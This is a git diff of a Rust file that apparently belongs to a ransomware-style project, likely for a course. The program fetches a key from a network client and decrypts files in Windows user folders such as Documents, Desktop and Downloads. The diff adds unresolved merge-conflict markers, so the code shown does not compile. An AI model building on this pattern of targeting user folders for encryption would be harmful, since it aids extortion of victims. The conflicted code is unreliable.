@@ -7,9 +7,15 @@ use std::path::PathBuf;
 use anyhow::Result;
 
 // use c_monster_co_2ic80::cryptography::encrypt::decrypt_folder;
+<<<<<<<<< Temporary merge branch 1
+use c_monster_co_2ic80::cryptography::decrypt_parallel::decrypt_folder_parallel;
+use c_monster_co_2ic80::debug_log;
+use c_monster_co_2ic80::cryptography::chunk::{DEBUG_ENABLED};
+=========
 use c_monster_co_2ic80::cryptography::chunk::DEBUG_ENABLED;
 use c_monster_co_2ic80::cryptography::decrypt_parallel::decrypt_folder_parallel;
 use c_monster_co_2ic80::debug_log;
+>>>>>>>>> Temporary merge branch 2
 use c_monster_co_2ic80::networking::client::get_key;
 
 use sodiumoxide::crypto::box_::PublicKey;
@@ -17,7 +23,11 @@ use sodiumoxide::crypto::box_::PublicKey;
 
 use windows::{
     Win32::UI::Shell::{
+<<<<<<<<< Temporary merge branch 1
+        FOLDERID_Desktop, FOLDERID_Documents, FOLDERID_Music, FOLDERID_Videos, KNOWN_FOLDER_FLAG,
+=========
         FOLDERID_Desktop, FOLDERID_Documents, FOLDERID_Music, FOLDERID_Videos, FOLDERID_Downloads, FOLDERID_Favorites, KNOWN_FOLDER_FLAG,
+>>>>>>>>> Temporary merge branch 2
         SHGetKnownFolderPath,
     },
     core::PWSTR,
@@ -45,7 +55,11 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         let mut input = String::new();
         io::stdin().read_line(&mut input)?;
     }
+<<<<<<<<< Temporary merge branch 1
+    
+=========
 
+>>>>>>>>> Temporary merge branch 2
     result
 }
 
@@ -59,6 +73,12 @@ async fn run_decryption() -> Result<(), Box<dyn std::error::Error>> {
     let paths = [
         FOLDERID_Music,
         FOLDERID_Documents,
+<<<<<<<<< Temporary merge branch 1
+        FOLDERID_Desktop,
+        FOLDERID_Videos,
+    ];
+    
+=========
         FOLDERID_Downloads,
         // FOLDERID_Desktop,
         FOLDERID_Favorites,
@@ -66,6 +86,7 @@ async fn run_decryption() -> Result<(), Box<dyn std::error::Error>> {
         FOLDERID_Downloads,
     ];
 
+>>>>>>>>> Temporary merge branch 2
     unsafe {
         for path in paths {
             let path_ptr: PWSTR = SHGetKnownFolderPath(&path, KNOWN_FOLDER_FLAG(0), None).unwrap();
